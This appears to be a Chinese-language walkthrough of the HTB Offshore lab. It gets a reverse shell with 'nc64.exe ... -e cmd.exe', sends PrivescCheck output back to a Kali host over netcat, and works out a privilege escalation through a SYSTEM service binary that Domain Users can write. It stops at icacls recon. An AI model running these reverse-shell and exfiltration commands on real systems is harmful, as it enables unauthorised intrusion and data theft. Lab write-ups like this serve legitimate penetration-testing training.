即便别人不传也可以自行通过rdp的浏览器下载kali主机上的nc

另起一个powershell

```c
PS C:\Users\ned.flanders_adm\Downloads> .\nc64.exe 10.10.16.30 6379 -e cmd.exe
```

```c
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/offshore]
└─# nc -lnvp 6679          
listening on [any] 6679 ...
connect to [10.10.16.30] from (UNKNOWN) [10.10.110.3] 61646
Microsoft Windows [Version 10.0.19041.1415]
(c) Microsoft Corporation. All rights reserved.

C:\Users\ned.flanders_adm\Downloads>
```

## PrivescCheck
### Rdp浏览器下载
![](/image/prolabs/Offshore-51.png)

```c
C:\Users\ned.flanders_adm\Downloads>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is FAE1-3F8F

 Directory of C:\Users\ned.flanders_adm\Downloads

02/10/2026  10:08 PM    <DIR>          .
02/10/2026  10:08 PM    <DIR>          ..
02/10/2026  03:45 PM            28,160 nc.exe
02/10/2026  10:08 PM           222,754 PrivescCheck.ps1
               2 File(s)        250,914 bytes
               2 Dir(s)   7,483,781,120 bytes free
```

### Powershell运行
```c
Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
. .\PrivescCheck.ps1
Invoke-PrivescCheck | Out-File -FilePath C:\Users\ned.flanders_adm\Downloads\check.txt
```

### kali下载
在 Kali：

```plain
nc -lnvp 9001 > check.txt
```

Windows：

```plain
type check.txt |.\nc64.exe 10.10.16.30 9001
```

### 文件内容
```plain
????????????????????????????????????????????????????????????????
? CATEGORY ? TA0043 - Reconnaissance                           ?
? NAME     ? User - Identity                                   ?
? TYPE     ? Base                                              ?
????????????????????????????????????????????????????????????????
? Get information about the current user (name, domain name)   ?
? and its access token (SID, integrity level, authentication   ?
? ID).                                                         ?
????????????????????????????????????????????????????????????????


Name             : CORP\ned.flanders_adm
SID              : S-1-5-21-2291914956-3290296217-2402366952-3604
IntegrityLevel   : Medium Mandatory Level (S-1-16-8192)
SessionId        : 2
TokenId          : 00000000-006299aa
AuthenticationId : 00000000-0016fd66
OriginId         : 00000000-000003e7
ModifiedId       : 00000000-0016fe14
Source           : User32 (00000000-0016fd4b)



[*] Status: Informational - Severity: None - Execution time: 00:00:00.366


????????????????????????????????????????????????????????????????
? CATEGORY ? TA0043 - Reconnaissance                           ?
? NAME     ? User - Groups                                     ?
? TYPE     ? Base                                              ?
????????????????????????????????????????????????????????????????
? Get information about the groups the current user belongs to ?
? (name, type, SID).                                           ?
????????????????????????????????????????????????????????????????

Name                                       Type           SID                              
----                                       ----           ---                              
CORP\Domain Users                          Group          S-1-5-21-2291914956-3290296217...
Everyone                                   WellKnownGroup S-1-1-0                          
BUILTIN\Remote Desktop Users               Alias          S-1-5-32-555                     
BUILTIN\Users                              Alias          S-1-5-32-545                     
NT AUTHORITY\REMOTE INTERACTIVE LOGON      WellKnownGroup S-1-5-14                         
NT AUTHORITY\INTERACTIVE                   WellKnownGroup S-1-5-4                          
NT AUTHORITY\Authenticated Users           WellKnownGroup S-1-5-11                         
NT AUTHORITY\This Organization             WellKnownGroup S-1-5-15                         
NT AUTHORITY\LogonSessionId_0_1506567      LogonSession   S-1-5-5-0-1506567                
LOCAL                                      WellKnownGroup S-1-2-0                          
Authentication authority asserted identity WellKnownGroup S-1-18-1                         
Mandatory Label\Medium Mandatory Level     Label          S-1-16-8192                      


[*] Status: Informational - Severity: None - Execution time: 00:00:00.123


????????????????????????????????????????????????????????????????
? CATEGORY ? TA0004 - Privilege Escalation                     ?
? NAME     ? User - Privileges                                 ?
? TYPE     ? Base                                              ?
????????????????????????????????????????????????????????????????
? Check whether the current user is granted privileges that    ?
? can be leveraged for local privilege escalation.             ?
????????????????????????????????????????????????????????????????

Name                          State    Description                          Exploitable
----                          -----    -----------                          -----------
SeShutdownPrivilege           Disabled Shut down the system                       False
SeChangeNotifyPrivilege       Enabled  Bypass traverse checking                   False
SeUndockPrivilege             Disabled Remove computer from docking station       False
SeIncreaseWorkingSetPrivilege Disabled Increase a process working set             False
SeTimeZonePrivilege           Disabled Change the time zone                       False


[*] Status: Informational (not vulnerable) - Severity: None - Execution time: 00:00:00.078


????????????????????????????????????????????????????????????????
? CATEGORY ? TA0004 - Privilege Escalation                     ?
? NAME     ? User - Privileges (GPO)                           ?
? TYPE     ? Base                                              ?
????????????????????????????????????????????????????????????????
? Check whether the current user is granted privileges,        ?
? through a group policy, that can be leveraged for local      ?
? privilege escalation.                                        ?
????????????????????????????????????????????????????????????????
[*] Status: Informational (not vulnerable) - Severity: None - Execution time: 00:00:00.204


????????????????????????????????????????????????????????????????
? CATEGORY ? TA0006 - Credential Access                        ?
? NAME     ? User - Environment Variables                      ?
? TYPE     ? Base                                              ?
????????????????????????????????????????????????????????????????
? Check whether any environment variables contain sensitive    ?
? information such as credentials or secrets. Note that this   ?
? check follows a keyword-based approach and thus might not be ?
? completely reliable.                                         ?
????????????????????????????????????????????????????????????????
[*] Status: Informational (nothing found) - Severity: None - Execution time: 00:00:00.084


????????????????????????????????????????????????????????????????
? CATEGORY ? TA0004 - Privilege Escalation                     ?
? NAME     ? Services - Non-Default Services                   ?
? TYPE     ? Base                                              ?
????????????????????????????????????????????????????????????????
? Get information about third-party services. It does so by    ?
? parsing the target executable's metadata and checking        ?
? whether the publisher is Microsoft.                          ?
????????????????????????????????????????????????????????????????


Name        : ssh-agent
DisplayName : OpenSSH Authentication Agent
ImagePath   : C:\WINDOWS\System32\OpenSSH\ssh-agent.exe
User        : LocalSystem
StartMode   : Disabled

Name        : VGAuthService
DisplayName : VMware Alias Manager and Ticket Service
ImagePath   : "C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe"
User        : LocalSystem
StartMode   : Automatic

Name        : vm3dservice
DisplayName : @oem0.inf,%VM3DSERVICE_DISPLAYNAME%;VMware SVGA Helper Service
ImagePath   : C:\WINDOWS\system32\vm3dservice.exe
User        : LocalSystem
StartMode   : Automatic

Name        : VMTools
DisplayName : VMware Tools
ImagePath   : "C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"
User        : LocalSystem
StartMode   : Automatic

Name        : WCAssistantService
DisplayName : WC Assistant
ImagePath   : C:\Program Files (x86)\Lavasoft\Web 
              Companion\Application\Lavasoft.WCAssistant.WinService.exe
User        : LocalSystem
StartMode   : Automatic



[*] Status: Informational - Severity: None - Execution time: 00:00:02.083


????????????????????????????????????????????????????????????????
? CATEGORY ? TA0004 - Privilege Escalation                     ?
? NAME     ? Services - Known Vulnerable Kernel Drivers        ?
? TYPE     ? Base                                              ?
????????????????????????????????????????????????????????????????
? Check whether known vulnerable kernel drivers are installed. ?
? It does so by computing the file hash of each driver and     ?
? comparing the value against the list provided by             ?
? loldrivers.io.                                               ?
????????????????????????????????????????????????????????????????
[*] Status: Informational (not vulnerable) - Severity: None - Execution time: 00:00:33.609


????????????????????????????????????????????????????????????????
? CATEGORY ? TA0004 - Privilege Escalation                     ?
? NAME     ? Services - Permissions                            ?
? TYPE     ? Base                                              ?
????????????????????????????????????????????????????????????????
? Check whether the current user has any write permissions on  ?
? a service through the Service Control Manager (SCM).         ?
????????????????????????????????????????????????????????????????
[*] Status: Informational (not vulnerable) - Severity: None - Execution time: 00:00:29.424


????????????????????????????????????????????????????????????????
? CATEGORY ? TA0004 - Privilege Escalation                     ?
? NAME     ? Services - Registry Permissions                   ?
? TYPE     ? Base                                              ?
????????????????????????????????????????????????????????????????
? Check whether the current user has any write permissions on  ?
? the configuration of a service in the registry.              ?
????????????????????????????????????????????????????????????????
[*] Status: Informational (not vulnerable) - Severity: None - Execution time: 00:00:05.003


????????????????????????????????????????????????????????????????
? CATEGORY ? TA0004 - Privilege Escalation                     ?
? NAME     ? Services - Image File Permissions                 ?
? TYPE     ? Base                                              ?
????????????????????????????????????????????????????????????????
? Check whether the current user has any write permissions on  ?
? a service's binary or its folder.                            ?
????????????????????????????????????????????????????????????????


Name              : WCAssistantService
DisplayName       : WC Assistant
User              : LocalSystem
ImagePath         : C:\Program Files (x86)\Lavasoft\Web 
                    Companion\Application\Lavasoft.WCAssistant.WinService.exe
StartMode         : Automatic
Type              : Win32OwnProcess
RegistryKey       : HKLM\SYSTEM\CurrentControlSet\Services
RegistryPath      : HKLM\SYSTEM\CurrentControlSet\Services\WCAssistantService
Status            : Running
UserCanStart      : True
UserCanStop       : True
ModifiablePath    : C:\Program Files (x86)\Lavasoft\Web 
                    Companion\Application\Lavasoft.WCAssistant.WinService.exe
IdentityReference : CORP\Domain Users (S-1-5-21-2291914956-3290296217-2402366952-513)
Permissions       : AllAccess



[*] Status: Vulnerable - Severity: High - Execution time: 00:00:23.435


????????????????????????????????????????????????????????????????
? CATEGORY ? TA0004 - Privilege Escalation                     ?
? NAME     ? Services - Unquoted Paths                         ?
? TYPE     ? Base                                              ?
????????????????????????????????????????????????????????????????
? Check whether there are services configured with an          ?
? exploitable unquoted path that contains spaces.              ?
????????????????????????????????????????????????????????????????
[*] Status: Informational (not vulnerable) - Severity: None - Execution time: 00:00:00.606


????????????????????????????????????????????????????????????????
? CATEGORY ? TA0004 - Privilege Escalation                     ?
? NAME     ? Services - Service Control Manager Permissions    ?
? TYPE     ? Base                                              ?
????????????????????????????????????????????????????????????????
? Check whether the current user has any write permissions on  ?
? the Service Control Manager (SCM).                           ?
????????????????????????????????????????????????????????????????
[*] Status: Informational (not vulnerable) - Severity: None - Execution time: 00:00:00.074


????????????????????????????????????????????????????????????????
? CATEGORY ? TA0004 - Privilege Escalation                     ?
? NAME     ? Scheduled Tasks - Image File Permissions          ?
? TYPE     ? Base                                              ?
????????????????????????????????????????????????????????????????
? Check whether the current user has any write permissions on  ?
? a scheduled task's binary or its folder. Note that           ?
? low-privileged users cannot list all the scheduled tasks.    ?
????????????????????????????????????????????????????????????????
[*] Status: Informational (not vulnerable) - Severity: None - Execution time: 00:00:03.920


????????????????????????????????????????????????????????????????
? CATEGORY ? TA0006 - Credential Access                        ?
? NAME     ? Credentials - Hive File Permissions               ?
? TYPE     ? Base                                              ?
????????????????????????????????????????????????????????????????
? Check whether the current user has read permissions on the   ?
? SAM/SYSTEM/SECURITY hive files, either in the system folder  ?
? or in volume shadow copies (CVE-2021-36934 - HiveNightmare). ?
????????????????????????????????????????????????????????????????
[*] Status: Informational (not vulnerable) - Severity: None - Execution time: 00:00:00.526


????????????????????????????????????????????????????????????????
? CATEGORY ? TA0006 - Credential Access                        ?
? NAME     ? Credentials - Unattend Files                      ?
? TYPE     ? Base                                              ?
????????????????????????????????????????????????????????????????
? Check whether there are any 'unattend' files and whether     ?
? they contain clear-text credentials.                         ?
????????????????????????????????????????????????????????????????
[*] Status: Informational (not vulnerable) - Severity: None - Execution time: 00:00:00.071


????????????????????????????????????????????????????????????????
? CATEGORY ? TA0006 - Credential Access                        ?
? NAME     ? Credentials - WinLogon                            ?
? TYPE     ? Base                                              ?
????????????????????????????????????????????????????????????????
? Check whether the 'WinLogon' registry key contains           ?
? clear-text credentials. Note that entries with an empty      ?
? password field are filtered out.                             ?
????????????????????????????????????????????????????????????????
[*] Status: Informational (not vulnerable) - Severity: None - Execution time: 00:00:00.022


????????????????????????????????????????????????????????????????
? CATEGORY ? TA0006 - Credential Access                        ?
? NAME     ? Credentials - Group Policy Preferences (GPP)      ?
? TYPE     ? Base                                              ?
????????????????????????????????????????????????????????????????
? Check whether there are cached Group Policy Preference (GPP) ?
? files that contain clear-text passwords.                     ?
????????????????????????????????????????????????????????????????
[*] Status: Informational (not vulnerable) - Severity: None - Execution time: 00:00:00.217


????????????????????????????????????????????????????????????????
? CATEGORY ? TA0006 - Credential Access                        ?
? NAME     ? Credentials - SCCM Network Access Account (NAA)   ?
? TYPE     ? Base                                              ?
????????????????????????????????????????????????????????????????
? Check whether SCCM NAA credentials are stored in the WMI     ?
? repository. If so, the username and password DPAPI blobs are ?
? returned, but can only be decrypted using the SYSTEM's DPAPI ?
? user key.                                                    ?
????????????????????????????????????????????????????????????????
[*] Status: Informational (not vulnerable) - Severity: None - Execution time: 00:00:00.528


????????????????????????????????????????????????????????????????
? CATEGORY ? TA0006 - Credential Access                        ?
? NAME     ? Credentials - SCCM Cache Folder                   ?
? TYPE     ? Base                                              ?
????????????????????????????????????????????????????????????????
? Check whether the SCCM cache folders contain files with      ?
? potentially hard coded credentials, or secrets, using basic  ?
? keywords such as 'password', or 'secret'.                    ?
????????????????????????????????????????????????????????????????
[*] Status: Informational (not vulnerable) - Severity: None - Execution time: 00:00:00.040


????????????????????????????????????????????????????????????????
? CATEGORY ? TA0006 - Credential Access                        ?
? NAME     ? Credentials - Symantec Account Connectivity       ?
? TYPE     ? Base                                              ?
????????????????????????????????????????????????????????????????
? Check whether a Symantec Management Agent (SMA) is installed ?
? and whether Account Connectivity Credentials (ACCs) are      ?
? stored locally.                                              ?
????????????????????????????????????????????????????????????????
[*] Status: Informational (not vulnerable) - Severity: None - Execution time: 00:00:00.024


????????????????????????????????????????????????????????????????
? CATEGORY ? TA0006 - Credential Access                        ?
? NAME     ? Credentials - SCOM Run As Account                 ?
? TYPE     ? Base                                              ?
????????????????????????????????????????????????????????????????
? Check whether the event logs contain traces of SCOM Run As   ?
? accounts being used locally. If so, the clear-text           ?
? credentials of those accounts can be extracted from the      ?
? registry with administrator privileges.                      ?
????????????????????????????????????????????????????????????????
[*] Status: Informational (not vulnerable) - Severity: None - Execution time: 00:00:00.043


????????????????????????????????????????????????????????????????
? CATEGORY ? TA0006 - Credential Access                        ?
? NAME     ? Hardening - LSA Protection                        ?
? TYPE     ? Base                                              ?
????????????????????????????????????????????????????????????????
? Check whether LSA protection is enabled. Note that when LSA  ?
? protection is enabled, 'lsass.exe' runs as a Protected       ?
? Process Light (PPL) and thus can only be accessed by other   ?
? protected processes with an equivalent or higher protection  ?
? level.                                                       ?
????????????????????????????????????????????????????????????????


Key         : HKLM\SYSTEM\CurrentControlSet\Control\Lsa
Value       : RunAsPPL
Data        : (null)
Description : LSA Protection is not enabled.



[*] Status: Vulnerable - Severity: Low - Execution time: 00:00:00.042


????????????????????????????????????????????????????????????????
? CATEGORY ? TA0006 - Credential Access                        ?
? NAME     ? Hardening - Credential Guard                      ?
? TYPE     ? Base                                              ?
????????????????????????????????????????????????????????????????
? Check whether Credential Guard is supported and enabled.     ?
? Note that when Credential Guard is enabled, credentials are  ?
? stored in an isolated process ('LsaIso.exe') that cannot be  ?
? accessed, even if the kernel is compromised.                 ?
????????????????????????????????????????????????????????????????


LsaCfgFlagsPolicyKey       : HKLM\SOFTWARE\Policies\Microsoft\Windows\DeviceGuard
LsaCfgFlagsPolicyValue     : LsaCfgFlags
LsaCfgFlagsPolicyData      : 1
LsaCfgFlagsKey             : HKLM\SYSTEM\CurrentControlSet\Control\LSA
LsaCfgFlagsValue           : LsaCfgFlags
LsaCfgFlagsData            : (null)
LsaCfgFlagsDescription     : Credential Guard is enabled with UEFI persistence.
CredentialGuardConfigured  : True
CredentialGuardRunning     : False
CredentialGuardDescription : Credential Guard is configured. Credential Guard is not 
                             running.



[*] Status: Vulnerable - Severity: Low - Execution time: 00:00:00.345


????????????????????????????????????????????????????????????????
? CATEGORY ? TA0008 - Lateral Movement                         ?
? NAME     ? Hardening - LAPS                                  ?
? TYPE     ? Base                                              ?
????????????????????????????????????????????????????????????????
? Check whether LAPS is configured and enabled. Note that this ?
? applies to domain-joined machines only.                      ?
????????????????????????????????????????????????????????????????


Policy      : Enable local admin password management (LAPS legacy)
Key         : HKLM\Software\Policies\Microsoft Services\AdmPwd
Default     : 0
Value       : 1
Description : The local administrator password is managed.



[*] Status: Informational (not vulnerable) - Severity: None - Execution time: 00:00:00.126


????????????????????????????????????????????????????????????????
? CATEGORY ? TA0001 - Initial Access                           ?
? NAME     ? Hardening - BitLocker                             ?
? TYPE     ? Base                                              ?
????????????????????????????????????????????????????????????????
? Check whether BitLocker is enabled on the system drive and   ?
? requires a second factor of authentication (PIN or startup   ?
? key). Note that this check might yield a false positive if a ?
? third-party drive encryption software is installed.          ?
????????????????????????????????????????????????????????????????


MachineRole : Workstation
TpmPresent  : False
Description : BitLocker is not enabled. No TPM found on this machine, this check is 
              probably irrelevant.



[*] Status: Vulnerable - Severity: Low - Execution time: 00:00:00.294


????????????????????????????????????????????????????????????????
? CATEGORY ? TA0004 - Privilege Escalation                     ?
? NAME     ? Configuration - PATH Folder Permissions           ?
? TYPE     ? Base                                              ?
????????????????????????????????????????????????????????????????
? Check whether the current user has any write permissions on  ?
? the system-wide PATH folders. If so, the system could be     ?
? vulnerable to privilege escalation through ghost DLL         ?
? hijacking.                                                   ?
????????????????????????????????????????????????????????????????
[*] Status: Informational (not vulnerable) - Severity: None - Execution time: 00:00:00.194


????????????????????????????????????????????????????????????????
? CATEGORY ? TA0004 - Privilege Escalation                     ?
? NAME     ? Misc - Known Ghost DLLs                           ?
? TYPE     ? Base                                              ?
????????????????????????????????????????????????????????????????
? Get information about services that are known to be prone to ?
? ghost DLL hijacking. Note that their exploitation requires   ?
? the current user to have write permissions on at least one   ?
? system-wide PATH folder.                                     ?
????????????????????????????????????????????????????????????????


Name           : cdpsgshims.dll
Description    : Loaded by the Connected Devices Platform Service (CDPSvc) upon startup.
RunAs          : NT AUTHORITY\LocalService
RebootRequired : True
Link           : https://nafiez.github.io/security/eop/2019/11/05/windows-service-host-proc
                 ess-eop.html

Name           : WptsExtensions.dll
Description    : Loaded by the Task Scheduler service (Schedule) upon startup.
RunAs          : LocalSystem
RebootRequired : True
Link           : http://remoteawesomethoughts.blogspot.com/2019/05/windows-10-task-schedule
                 rservice.html

Name           : SprintCSP.dll
Description    : Loaded by the Storage Service (StorSvc) when the RPC procedure 
                 'SvcRebootToFlashingMode' is invoked.
RunAs          : LocalSystem
RebootRequired : False
Link           : https://github.com/blackarrowsec/redteam-research/tree/master/LPE%20via%20
                 StorSvc



[*] Status: Informational - Severity: None - Execution time: 00:00:00.102


????????????????????????????????????????????????????????????????
? CATEGORY ? TA0004 - Privilege Escalation                     ?
? NAME     ? Configuration - NTLM Downgrade (NTLMv1)           ?
? TYPE     ? Base                                              ?
????????????????????????????????????????????????????????????????
? Check whether the machine is vulnerable to NTLM downgrade    ?
? attacks. If so, a local or remote attacker could capture the ?
? NTLMv1 authentication of the computer account (or another    ?
? authenticated user), and recover its NT hash offline.        ?
????????????????????????????????????????????????????????????????


NtlmMinServerSec                        : 536870912
NtlmMinServerSecDescription             : Require 128-bit encryption
BlockNtlmv1SSO                          : 0
BlockNtlmv1SSODescription               : The request to generate NTLMv1-credentials for a 
                                          logged-on user is audited but allowed to 
                                          succeed. Warning events are generated. This 
                                          setting is also called Audit mode.
NtlmMinClientSec                        : 536870912
NtlmMinClientSecDescription             : Require 128-bit encryption
RestrictSendingNTLMTraffic              : 0
RestrictSendingNTLMTrafficDescription   : Allow all
RestrictReceivingNTLMTraffic            : 0
RestrictReceivingNTLMTrafficDescription : Allow all
LmCompatibilityLevel                    : 3
LmCompatibilityLevelDescription         : Send NTLMv2 response only
CredentialGuard                         : Credential Guard is configured. Credential Guard 
                                          is not running.



[*] Status: Informational (not vulnerable) - Severity: None - Execution time: 00:00:00.076


????????????????????????????????????????????????????????????????
? CATEGORY ? TA0004 - Privilege Escalation                     ?
? NAME     ? Configuration - MSI AlwaysInstallElevated         ?
? TYPE     ? Base                                              ?
????????????????????????????????????????????????????????????????
? Check whether the 'AlwaysInstallElevated' policy is enabled  ?
? system-wide and for the current user. If so, the current     ?
? user may install a Windows Installer package with elevated   ?
? (SYSTEM) privileges.                                         ?
????????????????????????????????????????????????????????????????


LocalMachineKey   : HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
LocalMachineValue : AlwaysInstallElevated
LocalMachineData  : (null)
Description       : AlwaysInstallElevated is not enabled in HKLM.



[*] Status: Informational (not vulnerable) - Severity: None - Execution time: 00:00:00.022


????????????????????????????????????????????????????????????????
? CATEGORY ? TA0008 - Lateral Movement                         ?
? NAME     ? Configuration - WSUS                              ?
? TYPE     ? Base                                              ?
????????????????????????????????????????????????????????????????
? Check whether WSUS uses the HTTPS protocol to retrieve       ?
? updates from the on-premise update server. If WSUS uses the  ?
? clear-text HTTP protocol, it is vulnerable to MitM attacks   ?
? that may result in remote code execution as SYSTEM.          ?
????????????????????????????????????????????????????????????????


Key         : HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate
Value       : WUServer
Data        : (null)
Description : No WSUS server is configured (default).

Key         : HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU
Value       : UseWUServer
Data        : (null)
Description : WSUS server not enabled (default).

Key         : HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate
Value       : SetProxyBehaviorForUpdateDetection
Data        : (null)
Description : Proxy fallback not configured (default).

Key         : HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate
Value       : DisableWindowsUpdateAccess
Data        : (null)
Description : Windows Update features are enabled (default).



[*] Status: Informational (not vulnerable) - Severity: None - Execution time: 00:00:00.038


????????????????????????????????????????????????????????????????
? CATEGORY ? TA0008 - Lateral Movement                         ?
? NAME     ? Configuration - Hardened UNC Paths                ?
? TYPE     ? Base                                              ?
????????????????????????????????????????????????????????????????
? Check whether sensitive UNC paths are properly hardened.     ?
? Note that non-hardened UNC paths used for retrieving group   ?
? policies can be hijacked through an MitM attack to obtain    ?
? remote code execution as SYSTEM.                             ?
????????????????????????????????????????????????????????????????
[*] Status: Informational (not vulnerable) - Severity: None - Execution time: 00:00:00.022


????????????????????????????????????????????????????????????????
? CATEGORY ? TA0004 - Privilege Escalation                     ?
? NAME     ? Configuration - Point and Print                   ?
? TYPE     ? Base                                              ?
????????????????????????????????????????????????????????????????
? Check whether the Print Spooler service is enabled and if    ?
? the Point and Print configuration allows non-administrator   ?
? users to install printer drivers.                            ?
????????????????????????????????????????????????????????????????


Policy      : Limits print driver installation to Administrators
Key         : HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Printers\PointAndPrint
Value       : RestrictDriverInstallationToAdministrators
Data        : (null)
Default     : 1
Expected    : <null|1>
Description : Installing printer drivers when using Point and Print requires administrator 
              privileges (default). Note: this setting supersedes any other (Package) 
              Point and Print setting.

Policy      : Point and Print Restrictions > NoWarningNoElevationOnInstall
Key         : HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Printers\PointAndPrint
Value       : NoWarningNoElevationOnInstall
Data        : (null)
Default     : 0
Expected    : <null|0>
Description : Show warning and elevation prompt (default).

Policy      : Point and Print Restrictions > UpdatePromptSettings
Key         : HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Printers\PointAndPrint
Value       : UpdatePromptSettings
Data        : (null)
Default     : 0
Expected    : <null|0>
Description : Show warning and elevation prompt (default).

Policy      : Point and Print Restrictions > TrustedServers
Key         : HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Printers\PointAndPrint
Value       : TrustedServers
Data        : (null)
Default     : 0
Expected    : N/A
Description : Users can point and print to any server (default).

Policy      : Point and Print Restrictions > InForest
Key         : HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Printers\PointAndPrint
Value       : InForest
Data        : (null)
Default     : 0
Expected    : N/A
Description : Users can point and print to any machine (default).

Policy      : Point and Print Restrictions > ServerList
Key         : HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Printers\PointAndPrint
Value       : ServerList
Data        : (null)
Default     : (null)
Expected    : N/A
Description : A list of approved Point and Print servers is not defined (default).

Policy      : Package Point and print - Only use Package Point and Print
Key         : HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Printers\PackagePointAndPrint
Value       : PackagePointAndPrintOnly
Data        : (null)
Default     : 0
Expected    : N/A
Description : Users will not be restricted to package-aware point and print only (default).

Policy      : Package Point and print - Approved servers > PackagePointAndPrintServerList
Key         : HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Printers\PackagePointAndPrint
Value       : PackagePointAndPrintServerList
Data        : (null)
Default     : 0
Expected    : N/A
Description : Package point and print will not be restricted to specific print servers 
              (default).

Policy      : Package Point and print - Approved servers > PackagePointAndPrintServerList
Key         : HKLM\SOFTWARE\Policies\Microsoft\Windows 
              NT\Printers\PackagePointAndPrint\ListOfServers
Value       : N/A
Data        : (null)
Default     : (null)
Expected    : N/A
Description : A list of approved Package Point and Print servers is not defined (default).



[*] Status: Informational (not vulnerable) - Severity: None - Execution time: 00:00:00.119


????????????????????????????????????????????????????????????????
? CATEGORY ? TA0004 - Privilege Escalation                     ?
? NAME     ? Configuration - Application Repair Whitelist      ?
? TYPE     ? Base                                              ?
????????????????????????????????????????????????????????????????
? Check whether a whitelist of MSI packages is set in the      ?
? registry to disable UAC prompts, and whether they have       ?
? custom actions that may be leveraged for local privilege     ?
? escalation.                                                  ?
????????????????????????????????????????????????????????????????
[*] Status: Informational (not vulnerable) - Severity: None - Execution time: 00:00:00.097


????????????????????????????????????????????????????????????????
? CATEGORY ? TA0004 - Privilege Escalation                     ?
? NAME     ? Updates - Update History                          ?
? TYPE     ? Base                                              ?
????????????????????????????????????????????????????????????????
? Check whether a Windows security update was installed within ?
? the last 31 days.                                            ?
????????????????????????????????????????????????????????????????

HotFixID  Description     InstalledBy         InstalledOn          
--------  -----------     -----------         -----------          
KB5033052 Update          NT AUTHORITY\SYSTEM 2/25/2025 12:00:00 AM
KB5008212 Security Update NT AUTHORITY\SYSTEM 11/9/2023 12:00:00 AM
KB5007289 Update          NT AUTHORITY\SYSTEM 11/9/2023 12:00:00 AM
KB4577586 Update          NT AUTHORITY\SYSTEM 11/9/2023 12:00:00 AM
KB5031539 Update          NT AUTHORITY\SYSTEM 11/8/2023 12:00:00 AM
KB5015684 Update          NT AUTHORITY\SYSTEM 11/8/2023 12:00:00 AM


[*] Status: Vulnerable - Severity: Medium - Execution time: 00:00:07.045


????????????????????????????????????????????????????????????????
? CATEGORY ? TA0004 - Privilege Escalation                     ?
? NAME     ? Misc - Process and Thread Permissions             ?
? TYPE     ? Base                                              ?
????????????????????????????????????????????????????????????????
? Check whether the current user has any privileged access     ?
? right on a Process or Thread they do not own.                ?
????????????????????????????????????????????????????????????????
[*] Status: Informational (not vulnerable) - Severity: None - Execution time: 00:00:11.781


????????????????????????????????????????????????????????????????
? CATEGORY ? TA0004 - Privilege Escalation                     ?
? NAME     ? Misc - User Sessions                              ?
? TYPE     ? Base                                              ?
????????????????????????????????????????????????????????????????
? Get information about the currently logged-on users. Note    ?
? that it might be possible to capture or relay the            ?
? NTLM/Kerberos authentication of these users (RemotePotato0,  ?
? KrbRelay).                                                   ?
????????????????????????????????????????????????????????????????

SessionName UserName              Id        State
----------- --------              --        -----
Services                           0 Disconnected
            CORP\wsadmin           1 Disconnected
RDP-Tcp#0   CORP\ned.flanders_adm  2       Active
Console                            3    Connected


[*] Status: Informational - Severity: None - Execution time: 00:00:00.086



```

## 提权
### 漏洞分析
> 1. 你的当前权限画像（确认起点）
> + Name : CORP\ned.flanders_adm：当前是域用户，不是本地 SYSTEM。
> + IntegrityLevel : Medium：普通用户完整性，不是高完整性管理员。
> + User - Groups 里有 Domain Users、Remote Desktop Users：说明是低权远程登录场景。
> + User - Privileges 没有明显可直接利用的高危特权（如 SeImpersonatePrivilege 不在列表）→ 经典令牌提权路子不明显。  
  结论：你现在是标准低权用户，需要找配置错误提权。  

> 2. 第一优先级漏洞（你这份里最关键）
> + Services - Image File Permissions -> Status: Vulnerable - Severity: High
> + 命中服务：WCAssistantService
> + 关键字段：
>     - User : LocalSystem（服务以 SYSTEM 跑）
>     - ModifiablePath : ...Lavasoft.WCAssistant.WinService.exe
>     - IdentityReference : CORP\Domain Users
>     - Permissions : AllAccess  
  这组信息连起来的含义：
>
> 这个服务是 SYSTEM 身份运行；你还能启停服务触发执行。
>
> => 这是标准的服务二进制可写导致本地提权路径（HTB里常见“一步到位”点）。
>
> 
>
> 3. 其它 Vulnerable 项怎么解读（但优先级次于上面）
> + Hardening - LSA Protection = Low  
说明系统加固不足，但这通常是“后渗透价值”而非你当前低权直接提权入口。
> + Credential Guard configured but not running = Low  
同上，偏防护状态问题，不是立刻可打的初始提权点。
> + BitLocker not enabled = Low  
更偏主机防护，不是本地权限提升直接链路。
> + Updates - Update History = Medium  
最后补丁是 2025-02-25，而今天是 2026-02-11，超过31天未更新；说明潜在缺补丁，但“缺补丁≠一定可利用”，还要匹配具体 CVE  

> 4. 为什么其它信息大多可先放一边
> + Unquoted Paths、Service Permissions、Registry Permissions 都是 not vulnerable。
> + AlwaysInstallElevated not enabled。
> + PATH Folder Permissions not vulnerable。
> + 凭据类（unattend、GPP、Winlogon、SCCM）均未发现明文。
>
>   => 这些都说明：配置类提权里，最现实的就是 WCAssistantService 这个服务文件可写点。
>

### 服务提权
#### 信息收集
```plain
# 查看服务
C:\Users>sc qc WCAssistantService

[SC] QueryServiceConfig SUCCESS
SERVICE_NAME: WCAssistantService
        TYPE               : 10  WIN32_OWN_PROCESS 
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Program Files (x86)\Lavasoft\Web Companion\Application\Lavasoft.WCAssistant.WinService.exe
        LOAD_ORDER_GROUP   : 
        TAG                : 0
        DISPLAY_NAME       : WC Assistant
        DEPENDENCIES       : 
        SERVICE_START_NAME : LocalSystem

# 查看权限
C:\Users>icacls "C:\Program Files (x86)\Lavasoft\Web Companion\Application\Lavasoft.WCAssistant.WinService.exe"

# CORP\Domain Users:(I)(F)icacls "C:\Program Files (x86)\Lavasoft\Web Companion\Application\Lavasoft.WCAssistant.WinService.exe"
C:\Program Files (x86)\Lavasoft\Web Companion\Application\Lavasoft.WCAssistant.WinService.exe CORP\Domain Users:(I)(F)
                                                                                              NT AUTHORITY\SYSTEM:(I)(F)
                                                                                              BUILTIN\Administrators:(I)(F)
                                                                                              BUILTIN\Users:(I)(RX)
